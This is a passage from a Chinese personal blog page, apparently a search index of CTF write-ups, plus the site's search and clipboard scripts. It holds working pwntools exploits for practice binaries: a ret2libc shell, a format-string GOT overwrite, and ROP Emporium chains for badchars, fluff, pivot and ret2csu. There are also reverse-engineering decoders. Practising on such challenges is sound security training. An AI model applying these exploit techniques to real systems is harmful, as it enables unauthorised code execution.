# bin_addr    = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

# libcsearcher
# libc        = LibcSearcher(&amp;quot;puts&amp;quot;,puts_addr)
# libc_base   = puts_addr - libc.dump(&amp;quot;puts&amp;quot;)
# system_addr = libc_base + libc.dump(&amp;quot;system&amp;quot;)
# bin_addr    = libc_base + libc.dump(&amp;quot;str_bin_sh&amp;quot;)

libc_base   =   puts_addr - 0x080970
system_addr =   libc_base + 0x04f420
bin_addr    =   libc_base + 0x1b3d88

payload=b&#39;a&#39;*40+p64(pop_rdi_ret)+p64(bin_addr)+p64(ret)+p64(system_addr)
p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;moectf-2022&#34;&gt;[MoeCTF 2022]&lt;/h2&gt;
&lt;h3 id=&#34;babyfmt&#34;&gt;babyfmt&lt;/h3&gt;
&lt;p&gt;存在明显的格式化字符串漏洞，可以利用fmtstr_payload函数实现got表的替换，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(os=‘linux’,arch=‘i386’,log_level=‘debug’)

elf=ELF(‘./pwn’)

io.recvuntil(‘\n’)
io.sendline(b’%10$s’)

system_addr=int(io.recv(10),16)

print(hex(system_addr))
printf_got = elf.got[“printf”]

payload = fmtstr_payload(11,{printf_got:system_addr})

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;re&#34;&gt;re&lt;/h1&gt;
&lt;h2 id=&#34;flower&#34;&gt;flower&lt;/h2&gt;
&lt;p&gt;去掉花指令后得到&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1706613672043.png&#34; alt=&#34;1706613672043&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;脚本如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
int main(){
	unsigned char s[] =
{
  0xD0, 0xD0, 0x85, 0x85, 0x80, 0x80, 0xC5, 0x8A, 0x93, 0x89, 
  0x92, 0x8F, 0x87, 0x88, 0x9F, 0x8F, 0xC5, 0x84, 0xD6, 0xD1, 
  0xD2, 0x82, 0xD3, 0xDE, 0x87
};
	int i;
	int len=25;
	unsigned char v5[1000];
	for ( i = 0; i &amp;lt;= 255; ++i )
    	v5[i] = ~(i ^ len);
    int j;
    for ( i = 0; i &amp;lt; len ; i++ ){
    	for(j=0;j&amp;lt;1000;j++){
    		if(s[i]==v5[j]){
    			s[i]=j;
    			break;
			}
		}
	} 	
	printf(&amp;quot;%s&amp;quot;,s);
	return 0;
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;random_1&#34;&gt;Random_1&lt;/h2&gt;
&lt;p&gt;发现有反调试，修改ZF寄存器绕过，在b函数中发现有随机数种子，是伪随机，直接爆破，注意要在Linux系统下执行脚本，系统不同伪随机数也不同，脚本如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;math.h&amp;gt;
unsigned char s[] =
{
  0xEE, 0xE6, 0xD7, 0xB2, 0x8A, 0xAB, 0x13, 0x35, 0x02, 0x7B, 
  0xC9, 0xB9, 0x9C, 0xBA, 0xED, 0x2E, 0xBD, 0x4F, 0xFA, 0xEE, 
  0xC8, 0xF8, 0xE4, 0x16, 0x82, 0x63, 0x3B, 0x98, 0xF4, 0x14, 
  0x30, 0x38, 0x07, 0x36, 0x84, 0x3D, 0x0C, 0x36, 0x32, 0xEA, 
  0x55, 0xA6
};
unsigned char Table[] =
{
  0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 
  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 
  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 
  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 
  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 
  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 
  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 
  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 
  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 
  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 
  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 
  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 
  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 
  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 
  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 
  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 
  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 
  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 
  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 
  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 
  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 
  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 
  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 
  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 
  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 
  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
};
int main() {
	int i,j,m;
	srand(1400333646u);
	for ( i = 0; i &amp;lt; 42; i++ ){
		int rand_num = rand();
  		for(j=0;j&amp;lt;sizeof(Table)/sizeof(Table[0]);j++){
  			if(s[i]==Table[j]){
  				for(m=0;m&amp;lt;256;m++){
  					if(s[i] == Table[(16 * ((unsigned char)(m + rand_num % 255) &amp;gt;&amp;gt; 4) + 15) &amp;amp; (unsigned char)(m + rand_num % 255)]){
  						printf(&amp;quot;%c&amp;quot;,m);
					  }
				}
			}
		}
  	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;smc&#34;&gt;SMC&lt;/h2&gt;
&lt;p&gt;将本该是代码的数据通过动态调试修改为原本的代码，了解加密逻辑后脚本如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
#include&amp;lt;math.h&amp;gt;
unsigned char s[] =
{
  0x7C, 0x82, 0x75, 0x7B, 0x6F, 0x47, 0x61, 0x57, 0x53, 0x25, 
  0x47, 0x53, 0x25, 0x84, 0x6A, 0x27, 0x68, 0x27, 0x67, 0x6A, 
  0x7D, 0x84, 0x7B, 0x35, 0x35, 0x48, 0x25, 0x7B, 0x7E, 0x6A, 
  0x33, 0x71
};
int main() {
	int i;
	for(i=0;i&amp;lt;32;i++){
		s[i]=s[i]-5^0x11;
	}
	printf(&amp;quot;%s&amp;quot;,s);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">寒假学习</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/rop-emporium5-8/"" data-c="
          &lt;h1 id=&#34;badchars&#34;&gt;badchars&lt;/h1&gt;
&lt;p&gt;发现有字符过滤，不可出现’a’，’g’，’.’，’x’所以可以通过异或操作使字符串改变(逆向既视感)，所以查看是否有可用ROP&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984194157.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
构造exp&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./badchars&#39;)
elf = ELF(&#39;./badchars&#39;)

#gdb.attach(p)
#pause()

sem = &amp;quot;&amp;gt; &amp;quot;

p_plt = 0x400510
pop_rdi_addr = 0x4006a3
bss_addr = 0x601038
pop_r12_r13_r14_r15 = 0x40069c
pop_r15 = 0x4006a2
mov_r13_r12 = 0x400634
xor_r15_r14 = 0x400628

payload = b&#39;a&#39;*0x28 + p64(pop_r12_r13_r14_r15) + b&#39;flce,tzt&#39; + p64(bss_addr) + p64(2) + p64(bss_addr+2) + p64(mov_r13_r12) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+3) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+4) + p64(xor_r15_r14) + p64(pop_r15) + p64(bss_addr+6) + p64(xor_r15_r14) + p64(pop_rdi_addr) + p64(bss_addr) + p64(p_plt) 
p.sendafter(sem,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fluff&#34;&gt;fluff&lt;/h1&gt;
&lt;p&gt;根据题目描述找到&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984525151.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
。。。。。。。。是没有见过的汇编指令，经查询。。。。。。。。&lt;/p&gt;
&lt;p&gt;xlat指令：将[rbx+al]的值赋值给al，这里的64位解析出来gdb显示为xlatb，赋值后rax高位不变。等价于mov al,[rbx+al]&lt;/p&gt;
&lt;p&gt;bextr指令：byte extract。bextr dest src1 src2&lt;br&gt;
dest = (src1 &amp;gt;&amp;gt; (src2 &amp;amp; 0xFF)) &amp;amp; (1 &amp;lt;&amp;lt; ((src2 &amp;gt;&amp;gt; 8) &amp;amp; 0xFF) - 1)即src2的次低字节表示提取bit位数，最低字节表示提取bit位起始处。将src1提取src2中指定的比特位并赋值到dest中。&lt;br&gt;
例子：bextr rbx rcx rdx，设rcx = 0b10101100 01011101 00010001 11100111，rdx = 0x0509，0x05是提取的字节数，0x09是起始字节处&lt;/p&gt;
&lt;p&gt;stosb指令：将al赋值给[rdi]。等价于mov [rdi],al&lt;/p&gt;
&lt;p&gt;故可以通过al和rdi将目的字符串写入bss段中，在内存中找到flag.txt所对应各个字母的地址,exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

p = process(&#39;./fluff&#39;)
elf = ELF(&#39;./fluff&#39;)

flag_addr = [0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8]
flag = b&amp;quot;flag.txt&amp;quot;
pop_rdi_ret = 0x4006a3
xlat_addr = 0x400628  #mov al,[al+rbx]
pop_rdx_pop_rcx_bextr = 0x40062A  #bextr rbx,rcx,rdx
stosb_addr = 0x400639  #mov [rdi],al
bss_addr = 0x601038
printf_addr = 0x400510

payload=b&#39;a&#39;*0x28
for i in range(0,8):
    payload += p64(pop_rdx_pop_rcx_bextr)
    payload += p64(0x2000)  #begin = 0x00   len = 0x20          32bits = 4bytes
    if i==0:
        payload += p64(flag_addr[i] - 0x3EF2-0xb)    #rax = 0xb
    else:
        payload += p64(flag_addr[i] - 0x3EF2 - int(flag[i - 1]))   
    payload += p64(xlat_addr) + p64(pop_rdi_ret) + p64(bss_addr+i) + p64(stosb_addr)

payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(printf_addr)

#gdb.attach(p)
#pause()

p.sendline(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pivot&#34;&gt;pivot&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1705984643938.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
xchg:交换两个寄存器的值，所以可以改变栈的位置，并且有两个read函数，第二个栈溢出长度不足，所以发现是一道栈迁移的题，用第一个read制造栈帧，再用第二个read将栈迁移到栈帧处,exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./pivot&#39;)
elf = ELF(&#39;./pivot&#39;)
lib = ELF(&#39;./libpivot.so&#39;)

pop_rax = 0x4009BB
xchg_rax_rsp = 0x4009bd
mov_rax_addr = 0x4009C0
add_rax = 0x4009C4
jmp_rax = 0x4007C1
main_addr = 0x400847

sem = b&#39;&amp;gt; &#39;

p.recvuntil(b&#39;place to pivot: 0x&#39;)
stack = int(p.recv(12).decode(), 16)
print(&amp;quot;stack = &amp;quot;,stack)

payload0 = p64(elf.plt[&#39;foothold_function&#39;]) + p64(pop_rax) + p64(elf.got[&#39;foothold_function&#39;]) + p64(mov_rax_addr) + p64(add_rax) + p64(jmp_rax)
p.sendafter(sem, payload0)
print(&amp;quot;got = &amp;quot;,elf.got[&#39;foothold_function&#39;])

payload1 = b&#39;a&#39;*0x20 + p64(lib.symbols[&#39;ret2win&#39;] - lib.symbols[&#39;foothold_function&#39;]) + p64(pop_rax) + p64(stack) + p64(xchg_rax_rsp)
p.sendafter(sem, payload1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ret2csu&#34;&gt;ret2csu&lt;/h1&gt;
&lt;p&gt;根据题目可以得知是运用csu来传入寄存器参数，但是试了好多次都过不去，于是调试发现mov  edi, r13d&lt;br&gt;
出现了坑，而且r12的地址指向的指令最好不要对寄存器进行修改，起初想用mov和pop来尝试创造一个地址，但是没有找到对哪个寄存器指向的值进行修改的Gadgets，在原有的程序中有一个刚刚好的地址&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984731722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
指向&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1705984801957.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
刚刚好，剩下的就是正常的csu栈溢出了，exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./ret2csu&#39;)
elf = ELF(&#39;./ret2csu&#39;)
lib = ELF(&#39;./libret2csu.so&#39;)

pop_rbx = 0x40069a
mov_rdx_r15 = 0x400680
pop_rdi = 0x4006a3
ret2win_plt = elf.plt[&#39;ret2win&#39;]
sem = b&#39;&amp;gt; &#39;

payload = b&#39;a&#39;*40 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(pop_rbx) + p64(0) + p64(1) + p64(0x4003B0) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(mov_rdx_r15) + p64(0xdeadbeef) * 7 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(ret2win_plt)

p.sendafter(sem, payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ROP emporium(5-8)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
&lt;p&gt;仅用于学习用的小破站&lt;/p&gt;
&lt;h2 id=&#34;博主是谁&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;
&lt;p&gt;L1u66&lt;/p&gt;
&lt;h2 id=&#34;兴趣爱好&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;
&lt;p&gt;pwn，逆向&lt;/p&gt;
&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
&lt;p&gt;QQ：1755733326&lt;/p&gt;
">关于</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }

  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


  <script
    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
  <script>
    var scroll = new SmoothScroll('a[href*="#"]', {
      speed: 200
    });
  </script>



<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas>
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
<script type="text/javascript" src="/media/js/mouse/fireworks.js"></script>


  <script src="/media/js/cool.js"></script>



  <div class="snow-container"></div>
  <script src="/media/js/bg/snow.js"></script>

</html>